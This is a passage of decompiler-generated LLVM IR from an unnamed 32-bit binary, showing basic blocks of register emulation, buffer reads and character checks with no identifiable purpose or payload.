  %v3_804932b = add i32 %v2_804932b, %v0_804932b
  store i32 %v3_804932b, i32* %eax.global-to-local, align 4
  %v2_8049332 = add i32 %v1_8049325, -12
  %v3_8049332 = inttoptr i32 %v2_8049332 to i32*
  store i32 %v3_804932b, i32* %v3_8049332, align 4
  %v0_8049333 = load i32, i32* @esi, align 4
  %v2_8049333 = add i32 %v1_8049325, -16
  %v3_8049333 = inttoptr i32 %v2_8049333 to i32*
  store i32 %v0_8049333, i32* %v3_8049333, align 4
  %v0_8049334 = call i32 @function_80529a0()
  store i32 %v0_8049334, i32* %eax.global-to-local, align 4
  %v0_8049339 = load i32, i32* @esp, align 4
  %v1_8049339 = add i32 %v0_8049339, 16
  %v3_804933c = trunc i32 %v0_8049334 to i8
  %v4_804933c = icmp eq i8 %v3_804933c, 0
  store i1 %v4_804933c, i1* %zf.global-to-local, align 1
  %v1_804933e = icmp eq i1 %v4_804933c, false
  br i1 %v1_804933e, label %dec_label_pc_8049301, label %dec_label_pc_8049340

dec_label_pc_8049340:                             ; preds = %dec_label_pc_8049322
  %v1_8049340 = add i32 %v0_8049339, 20916
  %v2_8049340 = inttoptr i32 %v1_8049340 to i32*
  %v3_8049340 = load i32, i32* %v2_8049340, align 4
  store i32 %v3_8049340, i32* %eax.global-to-local, align 4
  %v1_8049347 = add i32 %v0_8049339, 108
  %v2_8049347 = inttoptr i32 %v1_8049347 to i32*
  %v3_8049347 = load i32, i32* %v2_8049347, align 4
  store i32 %v3_8049347, i32* %ecx.global-to-local, align 4
  %v1_804934b = add i32 %v3_8049340, 1
  store i32 %v1_804934b, i32* %eax.global-to-local, align 4
  store i32 %v1_804934b, i32* %v2_8049340, align 4
  %v0_8049353 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049353 = add i32 %v0_8049353, 16
  %v2_8049353 = inttoptr i32 %v1_8049353 to i32*
  %v3_8049353 = load i32, i32* %v2_8049353, align 4
  %v4_8049353 = load i32, i32* %eax.global-to-local, align 4
  %v5_8049353 = sub i32 %v3_8049353, %v4_8049353
  %v11_8049353 = xor i32 %v4_8049353, %v3_8049353
  %v12_8049353 = xor i32 %v5_8049353, %v3_8049353
  %v13_8049353 = and i32 %v12_8049353, %v11_8049353
  %v14_8049353 = icmp slt i32 %v13_8049353, 0
  %v15_8049353 = icmp eq i32 %v5_8049353, 0
  store i1 %v15_8049353, i1* %zf.global-to-local, align 1
  %v16_8049353 = icmp slt i32 %v5_8049353, 0
  %v3_8049356 = icmp eq i1 %v16_8049353, %v14_8049353
  %v4_8049356 = icmp eq i1 %v15_8049353, false
  %v5_8049356 = and i1 %v4_8049356, %v3_8049356
  br i1 %v5_8049356, label %dec_label_pc_8049322, label %dec_label_pc_8049358

dec_label_pc_8049358:                             ; preds = %dec_label_pc_8049340, %dec_label_pc_804930a
  %v0_8049358 = load i32, i32* @esp, align 4
  %v9_8049358 = icmp eq i32 %v0_8049358, 12
  store i1 %v9_8049358, i1* %zf.global-to-local, align 1
  %v0_804935b = load i32, i32* @esi, align 4
  %v2_804935b = add i32 %v0_8049358, -16
  %v3_804935b = inttoptr i32 %v2_804935b to i32*
  store i32 %v0_804935b, i32* %v3_804935b, align 4
  %v2_804935c = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_804935c, i32* %eax.global-to-local, align 4
  %v0_8049361 = load i32, i32* @esp, align 4
  %v1_8049361 = add i32 %v0_8049361, 16
  %v1_8049364 = add i32 %v2_804935c, -127
  %v6_8049364 = sub i32 126, %v2_804935c
  %v7_8049364 = and i32 %v6_8049364, %v2_804935c
  %v8_8049364 = icmp slt i32 %v7_8049364, 0
  %v9_8049364 = icmp eq i32 %v1_8049364, 0
  store i1 %v9_8049364, i1* %zf.global-to-local, align 1
  %v10_8049364 = icmp slt i32 %v1_8049364, 0
  %v3_8049367 = icmp eq i1 %v10_8049364, %v8_8049364
  %v4_8049367 = icmp eq i1 %v9_8049364, false
  %v5_8049367 = and i1 %v4_8049367, %v3_8049367
  br i1 %v5_8049367, label %dec_label_pc_8049301, label %dec_label_pc_8049369

dec_label_pc_8049369:                             ; preds = %dec_label_pc_8049358
  %v0_8049369 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8049369 = add i32 %v0_8049361, 12
  %v3_8049369 = inttoptr i32 %v2_8049369 to i32*
  store i32 %v0_8049369, i32* %v3_8049369, align 4
  %v0_804936a = load i32, i32* %ecx.global-to-local, align 4
  %v2_804936a = add i32 %v0_8049361, 8
  %v3_804936a = inttoptr i32 %v2_804936a to i32*
  store i32 %v0_804936a, i32* %v3_804936a, align 4
  %v0_804936b = load i32, i32* @esi, align 4
  %v2_804936b = add i32 %v0_8049361, 4
  %v3_804936b = inttoptr i32 %v2_804936b to i32*
  store i32 %v0_804936b, i32* %v3_804936b, align 4
  %v1_804936c = add i32 %v0_8049361, 108
  %v2_804936c = inttoptr i32 %v1_804936c to i32*
  %v3_804936c = load i32, i32* %v2_804936c, align 4
  store i32 %v3_804936c, i32* %edx.global-to-local, align 4
  %v1_8049370 = add i32 %v0_8049361, 92
  %v2_8049370 = inttoptr i32 %v1_8049370 to i32*
  %v3_8049370 = load i32, i32* %v2_8049370, align 4
  store i32 %v3_8049370, i32* %ecx.global-to-local, align 4
  %v1_8049374 = add i32 %v3_804936c, 16
  %v2_8049374 = inttoptr i32 %v1_8049374 to i32*
  %v3_8049374 = load i32, i32* %v2_8049374, align 4
  %v2_8049377 = mul i32 %v3_8049374, 128
  %v3_8049377 = icmp eq i32 %v2_8049377, 0
  store i1 %v3_8049377, i1* %zf.global-to-local, align 1
  %v2_804937a = add i32 %v3_8049370, 1472
  %v3_804937a = add i32 %v2_804937a, %v2_8049377
  store i32 %v3_804937a, i32* %eax.global-to-local, align 4
  %v3_8049381 = inttoptr i32 %v0_8049361 to i32*
  store i32 %v3_804937a, i32* %v3_8049381, align 4
  %v3_8049382 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049382, i32* %eax.global-to-local, align 4
  %v0_8049387 = load i32, i32* @esp, align 4
  %v1_8049387 = add i32 %v0_8049387, 108
  %v2_8049387 = inttoptr i32 %v1_8049387 to i32*
  %v3_8049387 = load i32, i32* %v2_8049387, align 4
  store i32 %v3_8049387, i32* %eax.global-to-local, align 4
  %v1_804938e = add i32 %v3_8049387, 16
  %v2_804938e = inttoptr i32 %v1_804938e to i32*
  %v3_804938e = load i32, i32* %v2_804938e, align 4
  %v1_8049391 = add i32 %v3_804938e, 1
  %v8_8049391 = icmp eq i32 %v1_8049391, 0
  store i1 %v8_8049391, i1* %zf.global-to-local, align 1
  store i32 %v1_8049391, i32* %edx.global-to-local, align 4
  store i32 %v1_8049391, i32* %v2_804938e, align 4
  %v0_8049301.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049301

dec_label_pc_804939a:                             ; preds = %dec_label_pc_804921b
  %v0_804939a = load i32, i32* %eax.global-to-local, align 4
  %v1_804939a = add i32 %v0_804939a, 1
  %v8_804939a = icmp eq i32 %v1_804939a, 0
  store i1 %v8_804939a, i1* %zf.global-to-local, align 1
  store i32 %v1_804939a, i32* %eax.global-to-local, align 4
  %v0_804939b = load i32, i32* @esi, align 4
  %v2_804939b = add i32 %v0_804939b, %v1_804939a
  store i32 %v2_804939b, i32* %ecx.global-to-local, align 4
  %v2_804939e = add i32 %v0_804923c, 124
  %v3_804939e = inttoptr i32 %v2_804939e to i32*
  store i32 %v2_804939b, i32* %v3_804939e, align 4
  %v0_804924d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804924d

dec_label_pc_80493a7:                             ; preds = %dec_label_pc_8048547
  %v1_80493a7 = add i32 %v0_80485a5, -1440
  %v2_80493a7 = inttoptr i32 %v1_80493a7 to i32*
  %v3_80493a7 = load i32, i32* %v2_80493a7, align 4
  %v1_80493af = urem i32 %v3_80493a7, 32
  store i32 %v1_80493af, i32* %eax.global-to-local, align 4
  %v2_80493b2 = udiv i32 %v3_80493a7, 32
  store i32 %v2_80493b2, i32* %edx.global-to-local, align 4
  %v0_80493b5 = load i32, i32* @esp, align 4
  %v2_80493b5 = mul nuw nsw i32 %v2_80493b2, 4
  %v3_80493b5 = add nuw nsw i32 %v2_80493b5, 20740
  %v4_80493b5 = add i32 %v3_80493b5, %v0_80493b5
  %v5_80493b5 = inttoptr i32 %v4_80493b5 to i32*
  %v6_80493b5 = load i32, i32* %v5_80493b5, align 4
  %v9_80493b5 = shl i32 1, %v1_80493af
  %v12_80493b5 = or i32 %v6_80493b5, %v9_80493b5
  store i32 %v12_80493b5, i32* %v5_80493b5, align 4
  %v0_80493bd = load i32, i32* @esi, align 4
  %v1_80493bd = add i32 %v0_80493bd, -1440
  %v2_80493bd = inttoptr i32 %v1_80493bd to i32*
  %v3_80493bd = load i32, i32* %v2_80493bd, align 4
  store i32 %v3_80493bd, i32* %eax.global-to-local, align 4
  %v1_80493c3 = load i32, i32* @esp, align 4
  %v2_80493c3 = add i32 %v1_80493c3, 72
  %v3_80493c3 = inttoptr i32 %v2_80493c3 to i32*
  %v4_80493c3 = load i32, i32* %v3_80493c3, align 4
  %v5_80493c3 = sub i32 %v3_80493bd, %v4_80493c3
  %v11_80493c3 = xor i32 %v4_80493c3, %v3_80493bd
  %v12_80493c3 = xor i32 %v5_80493c3, %v3_80493bd
  %v13_80493c3 = and i32 %v12_80493c3, %v11_80493c3
  %v14_80493c3 = icmp slt i32 %v13_80493c3, 0
  %v15_80493c3 = icmp eq i32 %v5_80493c3, 0
  store i1 %v15_80493c3, i1* %zf.global-to-local, align 1
  %v16_80493c3 = icmp slt i32 %v5_80493c3, 0
  %v3_80493c7 = icmp ne i1 %v16_80493c3, %v14_80493c3
  %v4_80493c7 = or i1 %v15_80493c3, %v3_80493c7
  br i1 %v4_80493c7, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_80493d2:                             ; preds = %dec_label_pc_804920d, %dec_label_pc_80491e0
  %v0_80493d2 = load i32, i32* @edi, align 4
  %v2_80493d2 = add i32 %v0_8049203, 12
  %v3_80493d2 = inttoptr i32 %v2_80493d2 to i32*
  store i32 %v0_80493d2, i32* %v3_80493d2, align 4
  %v0_80493d3 = load i32, i32* @edi, align 4
  %v2_80493d3 = add i32 %v0_8049203, 8
  %v3_80493d3 = inttoptr i32 %v2_80493d3 to i32*
  store i32 %v0_80493d3, i32* %v3_80493d3, align 4
  %v1_80493d4 = add i32 %v0_8049203, 4
  %v2_80493d4 = inttoptr i32 %v1_80493d4 to i32*
  store i32 0, i32* %v2_80493d4, align 4
  %v2_80493d6 = inttoptr i32 %v0_8049203 to i32*
  store i32 38, i32* %v2_80493d6, align 4
  %v3_80493d8 = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80493d8, i32* %eax.global-to-local, align 4
  %v0_80493dd = load i32, i32* @esp, align 4
  %v9_80493dd = icmp eq i32 %v0_80493dd, -12
  store i1 %v9_80493dd, i1* %zf.global-to-local, align 1
  %v2_80493e0 = add i32 %v0_80493dd, 8
  %v3_80493e0 = inttoptr i32 %v2_80493e0 to i32*
  store i32 %v3_80493d8, i32* %v3_80493e0, align 4
  %v1_80493e1 = add i32 %v0_80493dd, 120
  %v2_80493e1 = inttoptr i32 %v1_80493e1 to i32*
  %v3_80493e1 = load i32, i32* %v2_80493e1, align 4
  %v2_80493e5 = add i32 %v0_80493dd, 4
  %v3_80493e5 = inttoptr i32 %v2_80493e5 to i32*
  store i32 %v3_80493e1, i32* %v3_80493e5, align 4
  %v1_80493e6 = add i32 %v0_80493dd, 147
  store i32 %v1_80493e6, i32* @ecx, align 4
  %v3_80493ed = inttoptr i32 %v0_80493dd to i32*
  store i32 %v1_80493e6, i32* %v3_80493ed, align 4
  %v4_80493ee = call i32 @function_80528d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80493f3 = load i32, i32* @esp, align 4
  %v1_80493f6 = add i32 %v4_80493ee, 1
  %v8_80493f6 = icmp eq i32 %v1_80493f6, 0
  store i1 %v8_80493f6, i1* %zf.global-to-local, align 1
  store i32 %v1_80493f6, i32* %eax.global-to-local, align 4
  br i1 %v8_80493f6, label %dec_label_pc_8049854, label %dec_label_pc_80493fd

dec_label_pc_80493fd:                             ; preds = %dec_label_pc_80493d2
  %v0_80493fd = load i32, i32* @ebx, align 4
  %v2_80493fd = add i32 %v0_80493f3, 12
  %v3_80493fd = inttoptr i32 %v2_80493fd to i32*
  store i32 %v0_80493fd, i32* %v3_80493fd, align 4
  %v0_80493fe = load i32, i32* @ebx, align 4
  %v2_80493fe = add i32 %v0_80493f3, 8
  %v3_80493fe = inttoptr i32 %v2_80493fe to i32*
  store i32 %v0_80493fe, i32* %v3_80493fe, align 4
  %v1_80493ff = add i32 %v0_80493f3, 4
  %v2_80493ff = inttoptr i32 %v1_80493ff to i32*
  store i32 0, i32* %v2_80493ff, align 4
  %v2_8049401 = inttoptr i32 %v0_80493f3 to i32*
  store i32 38, i32* %v2_8049401, align 4
  %v3_8049403 = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049403, i32* %eax.global-to-local, align 4
  %v0_8049408 = load i32, i32* @esp, align 4
  %v9_8049408 = icmp eq i32 %v0_8049408, -12
  store i1 %v9_8049408, i1* %zf.global-to-local, align 1
  %v2_804940b = add i32 %v0_8049408, 8
  %v3_804940b = inttoptr i32 %v2_804940b to i32*
  store i32 %v3_8049403, i32* %v3_804940b, align 4
  %v1_804940c = add i32 %v0_8049408, 120
  %v2_804940c = inttoptr i32 %v1_804940c to i32*
  %v3_804940c = load i32, i32* %v2_804940c, align 4
  store i32 %v3_804940c, i32* @ecx, align 4
  %v2_8049410 = add i32 %v0_8049408, 4
  %v3_8049410 = inttoptr i32 %v2_8049410 to i32*
  store i32 %v3_804940c, i32* %v3_8049410, align 4
  %v1_8049411 = add i32 %v0_8049408, 147
  store i32 %v1_8049411, i32* %eax.global-to-local, align 4
  %v3_8049418 = inttoptr i32 %v0_8049408 to i32*
  store i32 %v1_8049411, i32* %v3_8049418, align 4
  %v4_8049419 = call i32 @function_80528d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049419, i32* %eax.global-to-local, align 4
  %v0_804941e = load i32, i32* @esp, align 4
  %v6_804941e = icmp eq i32 %v0_804941e, -16
  store i1 %v6_804941e, i1* %zf.global-to-local, align 1
  store i32 %v4_8049419, i32* %ebx.global-to-local, align 4
  %v3_8049423 = add i32 %v4_8049419, 147
  %v4_8049423 = add i32 %v3_8049423, %v0_804941e
  %v5_8049423 = inttoptr i32 %v4_8049423 to i8*
  %v6_8049423 = load i8, i8* %v5_8049423, align 1
  %v12_8049423 = icmp eq i8 %v6_8049423, 32
  %v1_804942b = zext i1 %v12_8049423 to i32
  %v1_804942e = add i32 %v0_804941e, 147
  store i32 %v1_804942e, i32* %esi.global-to-local, align 4
  store i32 %v1_804942b, i32* %eax.global-to-local, align 4
  %v1_804943a = add i32 %v0_804941e, 12
  %v2_804943a = inttoptr i32 %v1_804943a to i32*
  store i32 2, i32* %v2_804943a, align 4
  %v1_804943c = add i32 %v0_804941e, 8
  %v2_804943c = inttoptr i32 %v1_804943c to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v2_804943c, align 4
  %v0_8049441 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049441 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049441 = add i32 %v1_8049441, %v0_8049441
  store i32 %v2_8049441, i32* @ebx, align 4
  %v1_8049443 = add i32 %v0_804941e, 120
  %v2_8049443 = inttoptr i32 %v1_8049443 to i32*
  %v3_8049443 = load i32, i32* %v2_8049443, align 4
  %v2_8049447 = sub i32 %v3_8049443, %v2_8049441
  store i32 %v2_8049447, i32* %eax.global-to-local, align 4
  %v0_8049449 = load i32, i32* %esi.global-to-local, align 4
  %v2_8049449 = add i32 %v0_8049449, %v2_8049441
  %v12_8049449 = icmp eq i32 %v2_8049449, 0
  store i1 %v12_8049449, i1* %zf.global-to-local, align 1
  store i32 %v2_8049449, i32* @esi, align 4
  %v2_804944b = add i32 %v0_804941e, 4
  %v3_804944b = inttoptr i32 %v2_804944b to i32*
  store i32 %v2_8049447, i32* %v3_804944b, align 4
  %v0_804944c = load i32, i32* @esi, align 4
  %v3_804944c = inttoptr i32 %v0_804941e to i32*
  store i32 %v0_804944c, i32* %v3_804944c, align 4
  %v0_804944d = call i32 @function_8052690()
  store i32 %v0_804944d, i32* %eax.global-to-local, align 4
  %v0_8049452 = load i32, i32* @esp, align 4
  store i32 %v0_804944d, i32* %edx.global-to-local, align 4
  %v10_8049457 = icmp eq i32 %v0_804944d, -1
  store i1 %v10_8049457, i1* %zf.global-to-local, align 1
  br i1 %v10_8049457, label %dec_label_pc_8049854, label %dec_label_pc_8049460

dec_label_pc_8049460:                             ; preds = %dec_label_pc_80493fd
  %v10_8049460 = icmp eq i32 %v0_804944d, 1
  store i1 %v10_8049460, i1* %zf.global-to-local, align 1
  %v7_8049463 = icmp sgt i32 %v0_804944d, 1
  br i1 %v7_8049463, label %dec_label_pc_8049465, label %dec_label_pc_8049468

dec_label_pc_8049465:                             ; preds = %dec_label_pc_8049460
  %v1_8049465 = add i32 %v0_804944d, -2
  %v9_8049465 = icmp eq i32 %v1_8049465, 0
  store i1 %v9_8049465, i1* %zf.global-to-local, align 1
  store i32 %v1_8049465, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049468

dec_label_pc_8049468:                             ; preds = %dec_label_pc_8049460, %dec_label_pc_8049465
  %v0_8049471 = phi i32 [ %v0_804944d, %dec_label_pc_8049460 ], [ %v1_8049465, %dec_label_pc_8049465 ]
  %v1_8049468 = add i32 %v0_8049452, 20920
  %v1_804946f = load i32, i32* @ebx, align 4
  %v2_804946f = add i32 %v1_8049468, %v1_804946f
  %v12_804946f = icmp eq i32 %v2_804946f, 0
  store i1 %v12_804946f, i1* %zf.global-to-local, align 1
  store i32 %v2_804946f, i32* %eax.global-to-local, align 4
  %v1_8049471 = add i32 %v0_8049471, 1
  store i32 %v1_8049471, i32* @ebx, align 4
  %v2_8049474 = add i32 %v0_8049471, -20773
  %v3_8049474 = add i32 %v2_8049474, %v2_804946f
  %v4_8049474 = inttoptr i32 %v3_8049474 to i8*
  store i8 0, i8* %v4_8049474, align 1
  %v0_804947c = load i32, i32* @esp, align 4
  %v1_804947c = add i32 %v0_804947c, -4
  %v2_804947c = inttoptr i32 %v1_804947c to i32*
  store i32 4, i32* %v2_804947c, align 4
  %v1_804947e = add i32 %v0_804947c, -8
  %v2_804947e = inttoptr i32 %v1_804947e to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80554ab.15 to i32), i32* %v2_804947e, align 4
  %v0_8049483 = load i32, i32* @ebx, align 4
  %v2_8049483 = add i32 %v0_804947c, -12
  %v3_8049483 = inttoptr i32 %v2_8049483 to i32*
  store i32 %v0_8049483, i32* %v3_8049483, align 4
  %v0_8049484 = load i32, i32* @esi, align 4
  %v2_8049484 = add i32 %v0_804947c, -16
  %v3_8049484 = inttoptr i32 %v2_8049484 to i32*
  store i32 %v0_8049484, i32* %v3_8049484, align 4
  %v0_8049485 = call i32 @function_8052690()
  store i32 %v0_8049485, i32* @eax, align 4
  %v0_804948a = load i32, i32* @esp, align 4
  %v9_804948d = icmp eq i32 %v0_8049485, 4
  store i1 %v9_804948d, i1* %zf.global-to-local, align 1
  br i1 %v9_804948d, label %dec_label_pc_8049b1d, label %dec_label_pc_8049496

dec_label_pc_8049496:                             ; preds = %dec_label_pc_8049468
  %v1_804948a = add i32 %v0_804948a, 16
  %v0_8049496 = load i32, i32* @esi, align 4
  %v1_8049496 = inttoptr i32 %v0_8049496 to i8*
  %v2_8049496 = load i8, i8* %v1_8049496, align 1
  %v11_8049496 = icmp eq i8 %v2_8049496, 47
  store i1 %v11_8049496, i1* %zf.global-to-local, align 1
  br i1 %v11_8049496, label %dec_label_pc_8049c88, label %dec_label_pc_804949f

dec_label_pc_804949f:                             ; preds = %dec_label_pc_8049cbd, %dec_label_pc_8049c88, %dec_label_pc_8049bdf, %dec_label_pc_8049bbc, %dec_label_pc_8049496, %dec_label_pc_8049c14
  %v0_804949f = phi i32 [ %v1_8049cd2, %dec_label_pc_8049cbd ], [ %v1_8049cb2, %dec_label_pc_8049c88 ], [ %v1_8049c09, %dec_label_pc_8049bdf ], [ %v1_8049bd1, %dec_label_pc_8049bbc ], [ %v1_804948a, %dec_label_pc_8049496 ], [ %v1_8049c29, %dec_label_pc_8049c14 ]
  %v1_804949f = add i32 %v0_804949f, 92
  %v2_804949f = inttoptr i32 %v1_804949f to i32*
  %v3_804949f = load i32, i32* %v2_804949f, align 4
  store i32 %v3_804949f, i32* %edx.global-to-local, align 4
  %v1_80494a3 = add i32 %v3_804949f, -1448
  %v2_80494a3 = inttoptr i32 %v1_80494a3 to i8*
  store i8 1, i8* %v2_80494a3, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_80494af:                             ; preds = %dec_label_pc_8048d81
  %v1_80494af = call i32 @function_80530b9(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80494af, i32* %eax.global-to-local, align 4
  %v0_80494b4 = load i32, i32* @esp, align 4
  %v1_80494b4 = add i32 %v0_80494b4, 76
  %v2_80494b4 = inttoptr i32 %v1_80494b4 to i32*
  %v3_80494b4 = load i32, i32* %v2_80494b4, align 4
  store i32 %v3_80494b4, i32* %ecx.global-to-local, align 4
  %v1_80494b8 = add i32 %v0_80494b4, 92
  %v2_80494b8 = inttoptr i32 %v1_80494b8 to i32*
  %v3_80494b8 = load i32, i32* %v2_80494b8, align 4
  store i32 %v3_80494b8, i32* %edx.global-to-local, align 4
  %v1_80494be = add i32 %v3_80494b4, 1472
  store i32 %v1_80494be, i32* @ebp, align 4
  store i32 %v1_80494af, i32* @edi, align 4
  %v1_80494c6 = add i32 %v3_80494b4, 2116
  store i32 %v1_80494c6, i32* @esi, align 4
  %v1_80494cc = add i32 %v3_80494b8, 660
  %v2_80494cc = inttoptr i32 %v1_80494cc to i32*
  %v3_80494cc = load i32, i32* %v2_80494cc, align 4
  %v9_80494cc = icmp eq i32 %v3_80494cc, 1024
  store i1 %v9_80494cc, i1* %zf.global-to-local, align 1
  br i1 %v9_80494cc, label %dec_label_pc_8049605, label %dec_label_pc_80494dc

dec_label_pc_80494dc:                             ; preds = %dec_label_pc_80494af, %dec_label_pc_8049605, %dec_label_pc_80495f1
  %v0_80494dc = phi i32 [ %v0_80495e0, %dec_label_pc_80495f1 ], [ %v0_80494b4, %dec_label_pc_80494af ], [ %v0_80494dc.pre.pre, %dec_label_pc_8049605 ]
  %v1_80494dc = add i32 %v0_80494dc, 92
  %v2_80494dc = inttoptr i32 %v1_80494dc to i32*
  %v3_80494dc = load i32, i32* %v2_80494dc, align 4
  store i32 %v3_80494dc, i32* %eax.global-to-local, align 4
  %v0_80494e0 = load i32, i32* @edi, align 4
  %v1_80494e0 = inttoptr i32 %v0_80494e0 to i32*
  store i32 0, i32* %v1_80494e0, align 4
  %v0_80494e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80494e6 = add i32 %v0_80494e6, 660
  %v2_80494e6 = inttoptr i32 %v1_80494e6 to i32*
  %v3_80494e6 = load i32, i32* %v2_80494e6, align 4
  store i32 %v3_80494e6, i32* %edx.global-to-local, align 4
  %v2_80494f1 = sub i32 1024, %v3_80494e6
  %v12_80494f1 = icmp eq i32 %v2_80494f1, 0
  store i1 %v12_80494f1, i1* %zf.global-to-local, align 1
  store i32 %v2_80494f1, i32* %eax.global-to-local, align 4
  %v0_80494f3 = load i32, i32* @esp, align 4
  %v1_80494f3 = add i32 %v0_80494f3, -4
  %v2_80494f3 = inttoptr i32 %v1_80494f3 to i32*
  store i32 16384, i32* %v2_80494f3, align 4
  %v0_80494f8 = load i32, i32* @esi, align 4
  %v1_80494f8 = load i32, i32* %edx.global-to-local, align 4
  %v2_80494f8 = add i32 %v1_80494f8, %v0_80494f8
  store i32 %v2_80494f8, i32* %edx.global-to-local, align 4
  %v0_80494fb = load i32, i32* %eax.global-to-local, align 4
  %v2_80494fb = add i32 %v0_80494f3, -8
  %v3_80494fb = inttoptr i32 %v2_80494fb to i32*
  store i32 %v0_80494fb, i32* %v3_80494fb, align 4
  %v0_80494fc = load i32, i32* %edx.global-to-local, align 4
  %v2_80494fc = add i32 %v0_80494f3, -12
  %v3_80494fc = inttoptr i32 %v2_80494fc to i32*
  store i32 %v0_80494fc, i32* %v3_80494fc, align 4
  %v1_80494fd = add i32 %v0_80494f3, 92
  %v2_80494fd = inttoptr i32 %v1_80494fd to i32*
  %v3_80494fd = load i32, i32* %v2_80494fd, align 4
  store i32 %v3_80494fd, i32* %edx.global-to-local, align 4
  %v1_8049501 = add i32 %v3_80494fd, -1452
  %v2_8049501 = inttoptr i32 %v1_8049501 to i32*
  %v3_8049501 = load i32, i32* %v2_8049501, align 4
  store i32 %v3_8049501, i32* %eax.global-to-local, align 4
  %v2_8049507 = add i32 %v0_80494f3, -16
  %v3_8049507 = inttoptr i32 %v2_8049507 to i32*
  store i32 %v3_8049501, i32* %v3_8049507, align 4
  %v0_8049508 = call i32 @function_805324e()
  store i32 %v0_8049508, i32* %eax.global-to-local, align 4
  %v0_804950d = load i32, i32* @esp, align 4
  %v1_804950d = add i32 %v0_804950d, 16
  %v1_8049510 = icmp eq i32 %v0_8049508, 0
  store i1 %v1_8049510, i1* %zf.global-to-local, align 1
  br i1 %v1_8049510, label %dec_label_pc_8048e44, label %dec_label_pc_8049518

dec_label_pc_8049518:                             ; preds = %dec_label_pc_80494dc
  %v10_8049518 = icmp eq i32 %v0_8049508, -1
  store i1 %v10_8049518, i1* %zf.global-to-local, align 1
  br i1 %v10_8049518, label %dec_label_pc_8049b0f, label %dec_label_pc_8049521

dec_label_pc_8049521:                             ; preds = %dec_label_pc_8049518
  %v1_8049521 = add i32 %v0_804950d, 108
  %v2_8049521 = inttoptr i32 %v1_8049521 to i32*
  %v3_8049521 = load i32, i32* %v2_8049521, align 4
  store i32 %v3_8049521, i32* %edx.global-to-local, align 4
  %v1_8049525 = add i32 %v3_8049521, 660
  %v2_8049525 = inttoptr i32 %v1_8049525 to i32*
  %v3_8049525 = load i32, i32* %v2_8049525, align 4
  %v2_804952b = add i32 %v3_8049525, %v0_8049508
  %v12_804952b = icmp eq i32 %v2_804952b, 0
  store i1 %v12_804952b, i1* %zf.global-to-local, align 1
  store i32 %v2_804952b, i32* %ecx.global-to-local, align 4
  store i32 %v2_804952b, i32* %v2_8049525, align 4
  %v0_8049533 = load i32, i32* @esp, align 4
  %v1_8049533 = add i32 %v0_8049533, 116
  %v2_8049533 = inttoptr i32 %v1_8049533 to i32*
  %v3_8049533 = load i32, i32* %v2_8049533, align 4
  store i32 %v3_8049533, i32* %ecx.global-to-local, align 4
  %v1_8049537 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049537 = add i32 %v1_8049537, -1444
  %v3_8049537 = inttoptr i32 %v2_8049537 to i32*
  store i32 %v3_8049533, i32* %v3_8049537, align 4
  %v0_80495d1.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80495d1

dec_label_pc_8049542:                             ; preds = %dec_label_pc_80495d1
  %v1_8049542 = add i32 %v0_8049542, 660
  %v2_8049542 = inttoptr i32 %v1_8049542 to i32*
  %v3_8049542 = load i32, i32* %v2_8049542, align 4
  store i32 %v3_8049542, i32* %edx.global-to-local, align 4
  store i32 %v3_80495d1, i32* @ebx, align 4
  %v2_804954a = sub i32 %v3_80495d1, %v3_8049542
  %v8_804954a = xor i32 %v3_8049542, %v3_80495d1
  %v9_804954a = xor i32 %v2_804954a, %v3_80495d1
  %v10_804954a = and i32 %v9_804954a, %v8_804954a
  %v11_804954a = icmp slt i32 %v10_804954a, 0
  %v12_804954a = icmp eq i32 %v2_804954a, 0
  store i1 %v12_804954a, i1* %zf.global-to-local, align 1
  %v13_804954a = icmp slt i32 %v2_804954a, 0
  %v3_804954c = icmp ne i1 %v13_804954a, %v11_804954a
  %v4_804954c = or i1 %v12_804954a, %v3_804954c
  br i1 %v4_804954c, label %dec_label_pc_8049550, label %dec_label_pc_804954e

dec_label_pc_804954e:                             ; preds = %dec_label_pc_8049542
  store i32 %v3_8049542, i32* @ebx, align 4
  br label %dec_label_pc_8049550

dec_label_pc_8049550:                             ; preds = %dec_label_pc_8049542, %dec_label_pc_804954e
  %v1_8049554 = phi i32 [ %v3_80495d1, %dec_label_pc_8049542 ], [ %v3_8049542, %dec_label_pc_804954e ]
  %v0_8049550 = load i32, i32* @esp, align 4
  %v1_8049550 = add i32 %v0_8049550, 92
  %v2_8049550 = inttoptr i32 %v1_8049550 to i32*
  %v3_8049550 = load i32, i32* %v2_8049550, align 4
  store i32 %v3_8049550, i32* %edx.global-to-local, align 4
  %v2_8049554 = sub i32 %v3_80495d1, %v1_8049554
  store i32 %v2_8049554, i32* %eax.global-to-local, align 4
  %v2_8049556 = add i32 %v3_8049550, 12
  %v3_8049556 = inttoptr i32 %v2_8049556 to i32*
  store i32 %v2_8049554, i32* %v3_8049556, align 4
  %v0_8049559 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049559 = inttoptr i32 %v0_8049559 to i32*
  %v2_8049559 = load i32, i32* %v1_8049559, align 4
  %v11_8049559 = icmp eq i32 %v2_8049559, 1
  store i1 %v11_8049559, i1* %zf.global-to-local, align 1
  br i1 %v11_8049559, label %dec_label_pc_8049636, label %dec_label_pc_8049562

